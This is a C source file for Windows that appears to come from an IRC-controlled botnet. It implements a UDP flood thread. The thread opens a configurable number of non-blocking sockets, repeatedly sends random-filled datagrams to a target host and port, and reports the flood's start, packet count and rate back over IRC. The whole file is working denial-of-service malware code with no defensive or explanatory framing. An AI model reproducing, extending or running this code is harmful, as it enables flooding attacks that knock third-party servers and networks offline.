#include "includes.h"
#include "externs.h"

DWORD WINAPI XUdpFloodThread(LPVOID lpParam)
{
	UDPFLOODTHREAD thread = *((UDPFLOODTHREAD *)lpParam);
	UDPFLOODTHREAD *xinfo = (UDPFLOODTHREAD *)lpParam;
	xinfo->Gotit = TRUE;

	//free(lpParam);



	SOCKADDR_IN    sin;
	SOCKET *sock = NULL;

	XWStartup();

	sock =  (SOCKET *)XHeapAlloc((thread.MaxSockets + sizeof(SOCKET)) * sizeof(SOCKET));

	memset(&sin, 0, sizeof(sin));
	sin.sin_family = AF_INET;

	if (!thread.RemotePort)
		sin.sin_port = 	htons((short)rand()%65535);
	else
		sin.sin_port = htons(thread.RemotePort);

	sin.sin_addr.S_un.S_addr = inet_addr(XResolveHost2(thread.RemoteHost));

 	DWORD mode = 1, sent = 0, times = 0;
	int c = 0;


	// huge mem leak here :(

	XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[UDPFLOOD]: Flooding %s:%d for %d times with delay of %dms and %d sockets", thread.RemoteHost, thread.RemotePort, thread.Times, thread.Delay, thread.MaxSockets);

	DWORD start = GetTickCount();

	do
	{
		for (c = 0; c <= thread.MaxSockets; c++)
		{
			sent++;
			*(sock+c) = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
			if BAD_SOCKET(*(sock+c))
			{
				sent--;
				continue;
			}

		//	XSetTimeout(*(sock+c), 30, 30, TRUE);

		//	if (!thread.SendData)
				ioctlsocket(*(sock+c), FIONBIO, &mode);
		}
			
		for (c = 0; c <= thread.MaxSockets; c++)
		{
				memset(thread.Data, rand()%255, sizeof(thread.Data));


			if (sendto(*(sock+c), thread.Data, sizeof(thread.Data), 0, (LPSOCKADDR)&sin, sizeof(sin)) == SOCKET_ERROR)
			{
				sent--;
				continue;
			}
		}

      	Sleep(thread.Delay);
				
		for (c = 0; c <= thread.MaxSockets; c++) // replace < to <=
			closesocket(*(sock+c)); //close all sockets

		times++;
		
	} while (times <= thread.Times); // < to <=

	for (c = 0; c <= thread.MaxSockets; c++)
		closesocket(*(sock+c));

	DWORD stop = GetTickCount();

//	printf("t1: %d, t2: %d, r: %d\r\n", t1, t2, t2-t1);


//	XAddSystemLog("UDP Flood Complete, Used: %i Socket(s), Sent: %d Packet(s), Speed: %iKB/sec", thread.MaxSockets, sent, ((sent * 1024)/(t2-t1)));

//	XAddSystemLog("UDP Flood Complete, Used: %i Socket(s), Sent: %d Packet(s)", thread.MaxSockets, sent);

	XHeapFree(sock);

	XIRCMessage(thread.Session.irc->sock, TRUE, thread.Session.Notice, thread.Session.Silent, thread.Session.Destination, "[UDPFLOOD]: Finished flooding %s:%d, %d packet(s) sent (~%luMB) (~%luKB/s)", thread.RemoteHost, thread.RemotePort, sent, sent / 1024, (sent / ((stop-start)/1000))+1);

	XKillThread(thread.Threadnum, TRUE , FALSE);

	memset(&thread, 0, sizeof(thread));

	ExitThread(0);

}
